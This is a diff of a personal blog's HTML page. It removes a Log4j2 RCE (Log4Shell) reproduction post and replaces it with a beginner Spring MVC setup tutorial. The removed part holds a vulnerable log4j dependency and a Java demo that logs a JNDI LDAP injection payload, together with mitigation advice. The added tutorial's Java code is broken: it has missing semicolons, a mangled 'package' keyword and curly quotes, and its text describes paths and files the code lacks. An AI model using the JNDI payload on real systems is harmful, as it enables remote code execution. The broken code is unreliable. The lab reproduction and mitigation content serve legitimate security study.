@@ -13,7 +13,7 @@
         name="viewport"
         content="width=device-width, initial-scale=1, maximum-scale=1"
       />
-      <title>Apache Log4j2 RCE漏洞复现 |  小透的少年江湖</title>
+      <title>第一个Spring-MVC项目 |  小透的少年江湖</title>
   <meta name="generator" content="hexo-theme-ayer">
       
       <link rel="shortcut icon" href="/haoyun.ico" />
@@ -58,7 +58,7 @@
     <main class="content on">
       <section class="outer">
   <article
-  id="post-Apache Log4j2 RCE漏洞复现"
+  id="post-第一个Spring-MVC项目"
   class="article article-type-post"
   itemscope
   itemprop="blogPost"
@@ -69,7 +69,7 @@
     <header class="article-header">
        
 <h1 class="article-title sea-center" style="border-left:0" itemprop="name">
-  Apache Log4j2 RCE漏洞复现
+  第一个Spring-MVC项目
 </h1>
  
 
@@ -77,11 +77,11 @@
     </header>
      
     <div class="article-meta">
-      <a href="/2021/12/11/Apache%20Log4j2%20RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="article-date">
-  <time datetime="2021-12-11T12:32:03.000Z" itemprop="datePublished">2021-12-11</time>
+      <a href="/2022/04/02/%E7%AC%AC%E4%B8%80%E4%B8%AASpring-MVC%E9%A1%B9%E7%9B%AE/" class="article-date">
+  <time datetime="2022-04-02T01:56:28.000Z" itemprop="datePublished">2022-04-02</time>
 </a> 
   <div class="article-category">
-    <a class="article-category-link" href="/categories/Web%E6%BC%8F%E6%B4%9E/">Web漏洞</a> / <a class="article-category-link" href="/categories/Web%E6%BC%8F%E6%B4%9E/Web%E5%AE%B9%E5%99%A8%E6%BC%8F%E6%B4%9E/">Web容器漏洞</a> / <a class="article-category-link" href="/categories/Web%E6%BC%8F%E6%B4%9E/Web%E5%AE%B9%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/">Apache</a>
+    <a class="article-category-link" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a> / <a class="article-category-link" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/java/">java</a> / <a class="article-category-link" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/java/Spring/">Spring</a>
   </div>
   
 <div class="word_count">
@@ -89,7 +89,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> 字数统计:</span>
-            <span class="post-count">796</span>
+            <span class="post-count">717</span>
         </span>
     </span>
 
@@ -113,58 +113,63 @@
   
     <div class="article-entry" itemprop="articleBody">
        
-  <h1 id="Apache-Log4j2-RCE漏洞复现"><a href="#Apache-Log4j2-RCE漏洞复现" class="headerlink" title="Apache Log4j2 RCE漏洞复现"></a>Apache Log4j2 RCE漏洞复现</h1><h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p>Apache Log4j2是一个基于Java的日志记录工具。该工具重写了Log4j框架，并且引入了大量丰富的特性。该日志框架被大量用于业务系统开发，用来记录日志信息。大多数情况下，开发者可能会将用户输入导致的错误信息写入日志中。</p>
-<p><strong>此次漏洞触发条件为只要外部用户输入的数据会被日志记录，即可造成远程代码执行</strong></p>
-<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Apache Log4j 2.x &lt;= 2.14.1</span><br></pre></td></tr></table></figure>
+  <h1 id="第一个Spring-MVC项目"><a href="#第一个Spring-MVC项目" class="headerlink" title="第一个Spring-MVC项目"></a>第一个Spring-MVC项目</h1><h2 id="项目创建"><a href="#项目创建" class="headerlink" title="项目创建"></a>项目创建</h2><p>首先在IDEA中新建项目选择Java进行新建</p>
+<img src="/2022/04/02/%E7%AC%AC%E4%B8%80%E4%B8%AASpring-MVC%E9%A1%B9%E7%9B%AE/image-20220402152510269.png" class title="image-20220402152510269">
+
+<p>创建项目成功</p>
+<img src="/2022/04/02/%E7%AC%AC%E4%B8%80%E4%B8%AASpring-MVC%E9%A1%B9%E7%9B%AE/image-20220402152639568.png" class title="image-20220402152639568">
+
+<h2 id="添加SpringMVC"><a href="#添加SpringMVC" class="headerlink" title="添加SpringMVC"></a>添加SpringMVC</h2><p>右键项目名称点击添加框架支持</p>
+<img src="/2022/04/02/%E7%AC%AC%E4%B8%80%E4%B8%AASpring-MVC%E9%A1%B9%E7%9B%AE/image-20220402152828851.png" class title="image-20220402152828851">
+
+<p>选择Spring MVC进行下载添加</p>
+<img src="/2022/04/02/%E7%AC%AC%E4%B8%80%E4%B8%AASpring-MVC%E9%A1%B9%E7%9B%AE/image-20220402152930006.png" class title="image-20220402152930006">
+
+<p>下载完成后发现项目下多了lib(存放依赖包)和web文件夹</p>
+<img src="/2022/04/02/%E7%AC%AC%E4%B8%80%E4%B8%AASpring-MVC%E9%A1%B9%E7%9B%AE/image-20220402153227310.png" class title="image-20220402153227310">
+
+<p>然后设置项目结构（Project Structure），选择**Artifacts&#x3D;&gt;Fix(在右下角)**添加依赖</p>
+<img src="/2022/04/02/%E7%AC%AC%E4%B8%80%E4%B8%AASpring-MVC%E9%A1%B9%E7%9B%AE/image-20220402153530707.png" class title="image-20220402153530707">
+
+<h2 id="添加Tomcat"><a href="#添加Tomcat" class="headerlink" title="添加Tomcat"></a>添加Tomcat</h2><p>点击右上角的Add Configuration，点击+号选择Tomcat Local</p>
+<img src="/2022/04/02/%E7%AC%AC%E4%B8%80%E4%B8%AASpring-MVC%E9%A1%B9%E7%9B%AE/image-20220402160742627.png" class title="image-20220402160742627">
+
+<p>配置Tomcat文件及其相关配置</p>
+<img src="/2022/04/02/%E7%AC%AC%E4%B8%80%E4%B8%AASpring-MVC%E9%A1%B9%E7%9B%AE/image-20220402161031367.png" class title="image-20220402161031367">
+
+<p>点击运行程序后通过浏览器访问默认页面，运行效果如下：</p>
+<img src="/2022/04/02/%E7%AC%AC%E4%B8%80%E4%B8%AASpring-MVC%E9%A1%B9%E7%9B%AE/image-20220402161439032.png" class title="image-20220402161439032">
+
+<h2 id="SpringMVC应用创建"><a href="#SpringMVC应用创建" class="headerlink" title="SpringMVC应用创建"></a>SpringMVC应用创建</h2><p>首先在src文件夹下新建包org.springmvc.helloworld和类TestController.java</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">package org.springmvc.helloworld;</span><br><span class="line">import org.springframework.stereotype.Controller</span><br><span class="line">import org.springframework.web.bind.annotation.RequestMapping</span><br><span class="line"></span><br><span class="line">        @Controller</span><br><span class="line">public class TestController &#123;</span><br><span class="line">        @RequestMapping(&quot;/test&quot;)</span><br><span class="line">            public String helloworld()&#123;</span><br><span class="line">            return &quot;hello&quot;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+
+<p>该代码通过RequestMapping对访问路径进行定义，这里以test对父目录进行定义，然后以Index对子目录进行定义，helloworld方法通过&#x2F;test&#x2F;index这个URL来访问helloworld.jsp这个文件</p>
+<p>接下来在jsp文件夹下创建hello.jsp文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;%--</span><br><span class="line">  Created by IntelliJ IDEA.</span><br><span class="line">  User: Administrator</span><br><span class="line">  Date: 2022/4/2</span><br><span class="line">  Time: 16:32</span><br><span class="line">  To change this template use File | Settings | File Templates.</span><br><span class="line">--%&gt;</span><br><span class="line">&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Title&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">Hello!!!!! Whale-fall</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>运行tomcat后，通过浏览器访问</p>
+<img src="/2022/04/02/%E7%AC%AC%E4%B8%80%E4%B8%AASpring-MVC%E9%A1%B9%E7%9B%AE/image-20220402200121507.png" class title="image-20220402200121507">
+
+<h2 id="SpringMVC-Model向view传值"><a href="#SpringMVC-Model向view传值" class="headerlink" title="SpringMVC Model向view传值"></a>SpringMVC Model向view传值</h2><p>上图已经成功创建了视图，接下来就是通过Model向view进行传值输出。</p>
+<p>这里需要引用org.springframework.ui.Model包对相关变量进行赋值，代码如下:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ackage com.springmvc.Controller;</span><br><span class="line"></span><br><span class="line">import org.springframework.stereotype.Controller;</span><br><span class="line">import org.springframework.ui.Model;</span><br><span class="line">import org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line">@Controller</span><br><span class="line">public class HelloWorldController &#123;</span><br><span class="line">    @RequestMapping(value=&quot;/test&quot;)</span><br><span class="line">    public String hello(Model model)&#123;</span><br><span class="line">        model.addAttribute(“name”,&quot;whale-fall&quot;)</span><br><span class="line">        return &quot;hello&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 
 
-<h3 id="漏洞简析"><a href="#漏洞简析" class="headerlink" title="漏洞简析"></a>漏洞简析</h3><p>由于Apache Log4j2某些功能存在递归解析功能，攻击者可直接构造恶意请求，触发远程代码执行漏洞。漏洞利用无需特殊配置，经阿里云安全团队验证，Apache Struts2、Apache Solr、Apache Druid、Apache Flink等均受影响。</p>
-<h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>在IDEA中新建一个Maven项目，在pom.xml中导入依赖文件下载log4j程序包</p>
-<p>pom.xml文件如下:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">        &lt;!-- https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-core --&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;log4j-core&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;2.14.1&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">        &lt;!-- https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-api --&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;log4j-api&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;2.14.1&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">    &lt;/dependencies&gt;</span><br></pre></td></tr></table></figure>
+<p>hello.jap文件修改如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; isELIgnored=&quot;false&quot; %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;hello&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt;hello!!!!!$&#123;name&#125;&lt;/h1&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
 
+<p>运行tomcat通过浏览器访问</p>
+<img src="/2022/04/02/%E7%AC%AC%E4%B8%80%E4%B8%AASpring-MVC%E9%A1%B9%E7%9B%AE/image-20220402201015681.png" class title="image-20220402201015681">
 
+<p>这里的输出和上面的一样，但不同的是通过变量值来传参输出的</p>
+<h2 id="SpringMVC获取URL参数值"><a href="#SpringMVC获取URL参数值" class="headerlink" title="SpringMVC获取URL参数值"></a>SpringMVC获取URL参数值</h2><p>我们知道如何对视图进行传值，那如果我们需要从URL中获取到参数来输出呢？只需要在定义方法时顺便写上需要的参数即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">package com.springmvc.Controller;</span><br><span class="line"></span><br><span class="line">import org.springframework.stereotype.Controller;</span><br><span class="line">import org.springframework.ui.Model;</span><br><span class="line">import org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line">@Controller</span><br><span class="line">public class HelloWorldController &#123;</span><br><span class="line">    @RequestMapping(value=&quot;/test&quot;)</span><br><span class="line">    public String hello(String name,Model model)&#123;</span><br><span class="line">        model.addAttribute(&quot;name&quot;,&quot;whale-fall&quot;);</span><br><span class="line">        return &quot;hello&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>点击下载相应程序包资源</p>
-<p>![image-20220207115326014](Apache Log4j2 RCE漏洞复现&#x2F;image-20220207115326014.png)</p>
-<p>这里使用JNDI注入工具开启rmi服务或者idap服务执行本地命令，如下:</p>
-<p>![image-20220207115341295](Apache Log4j2 RCE漏洞复现&#x2F;image-20220207115341295.png)</p>
-<p>下面为测试Demo(由于我的jdk版本不适用RMI-JDNI注入，这里使用的是ldap协议)</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Logger logger = LogManager.getLogger(Test.class);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        logger.error(<span class="string">&quot;$&#123;jndi:ldap://127.0.0.1:1389/ehm23c&#125;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>通过浏览器 &#x2F;?name&#x3D;whale-fall进行传参</p>
+<img src="/2022/04/02/%E7%AC%AC%E4%B8%80%E4%B8%AASpring-MVC%E9%A1%B9%E7%9B%AE/image-20220402203152029.png" class title="image-20220402203152029">
 
-
-
-<p>运行结果:</p>
-<p>![image-20220207115350383](Apache Log4j2 RCE漏洞复现&#x2F;image-20220207115350383.png)</p>
-<h2 id="痕迹分析"><a href="#痕迹分析" class="headerlink" title="痕迹分析"></a>痕迹分析</h2><p>主要查看日志，观察日志中是否存在错误记录</p>
-<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>经验证 2.15.0-rc1 版本存在绕过，实际受影响范围如下：</p>
-<p>Apache Log4j 2.x &lt; 2.15.0-rc2</p>
-<p>影响判断方式：用户只需排查Java应用是否引入 log4j-api , log4j-core 两个jar。若存在应用使用，极大可能会受到影响。</p>
-<p><strong>已知影响组件</strong></p>
-<ul>
-<li>Apache Struts2</li>
-<li>Apache Solr</li>
-<li>Apache Flink</li>
-<li>Apache Druid</li>
-<li>ElasticSearch</li>
-<li>flume</li>
-<li>dubbo</li>
-<li>Redis</li>
-<li>logstash</li>
-<li>kafka</li>
-</ul>
-<h2 id="防护方案"><a href="#防护方案" class="headerlink" title="防护方案"></a>防护方案</h2><p>1、禁止使用 log4j 服务器外连，升级 jdk 11.0.1 8u191 7u201 6u211 或更高版本。 </p>
-<p>2、升级至 log4j-2.15.0-rc2： </p>
-<p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2">https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2</a> </p>
-<p>3、紧急缓解措施： </p>
-<p>（1） 修改 jvm 参数 -Dlog4j2.formatMsgNoLookups&#x3D;true </p>
-<p>（2） 修改配置 log4j2.formatMsgNoLookups&#x3D;True </p>
-<p>（3） 将系统环境变量FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS 设置 为 true</p>
-<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>[1] <a target="_blank" rel="noopener" href="https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc1">https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc1</a></p>
-<p>[2] [<a target="_blank" rel="noopener" href="https://issues.apache.org/jira/projects/LOG4J2/issues/LOG4J2-3201?filter=allissues">LOG4J2-3201] Limit the protocols jNDI can use and restrict LDAP. - ASF JIRA (apache.org)</a></p>
-<p>[3] <a target="_blank" rel="noopener" href="https://gitbox.apache.org/repos/asf?p=logging-log4j2.git;a=blob;f=log4j-core/src/test/java/org/apache/logging/log4j/core/lookup/JndiRestrictedLookupTest.java;h=032c9c4d85204e6490a734724c8d549c50de7164;hb=d82b47c">ASF Git Repos - logging-log4j2.git&#x2F;blob - log4j-core&#x2F;src&#x2F;test&#x2F;java&#x2F;org&#x2F;apache&#x2F;logging&#x2F;log4j&#x2F;core&#x2F;lookup&#x2F;JndiRestrictedLookupTest.java</a></p>
-<p>[4] <a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/RXSiFrj5UOs3kzXSUsMbvw">Apache Log4j2RCE漏洞复现 (qq.com)</a></p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_36890370/article/details/113815490">(67条消息) IDEA2020 创建一个SpringMVC工程_逮仔的博客-CSDN博客_idea创建springmvc工程</a></p>
  
       <!-- reward -->
       
@@ -235,12 +240,12 @@
     <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2021/12/11/Apache%20Log4j2%20RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" alt="微信分享二维码">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2022/04/02/%E7%AC%AC%E4%B8%80%E4%B8%AASpring-MVC%E9%A1%B9%E7%9B%AE/" alt="微信分享二维码">
     </div>
 </div>
 
 <div id="share-mask"></div>  
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web%E6%BC%8F%E6%B4%9E-Apache%E6%BC%8F%E6%B4%9E-Log4j2/" rel="tag">-web漏洞 -Apache漏洞 -Log4j2</a></li></ul>
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Java-Spring-MVC-%E6%A1%86%E6%9E%B6/" rel="tag">-Java -Spring MVC -框架</a></li></ul>
 
     </footer>
   </div>
@@ -248,19 +253,19 @@
    
   <nav class="article-nav">
     
-      <a href="/2022/01/23/git%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/" class="article-nav-link">
+      <a href="/2022/04/02/CTF%E7%BB%83%E4%B9%A0-Reverse%E7%B3%BB%E5%88%97-HighwayHash64/" class="article-nav-link">
         <strong class="article-nav-caption">上一篇</strong>
         <div class="article-nav-title">
           
-            git用法小记
+            CTF练习-Reverse系列-HighwayHash64
           
         </div>
       </a>
     
     
-      <a href="/2021/12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/" class="article-nav-link">
+      <a href="/2022/03/31/Spring-Cloud-Function-SpEl%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/" class="article-nav-link">
         <strong class="article-nav-caption">下一篇</strong>
-        <div class="article-nav-title">MSSQL注入学习</div>
+        <div class="article-nav-title"></div>
       </a>
     
   </nav>
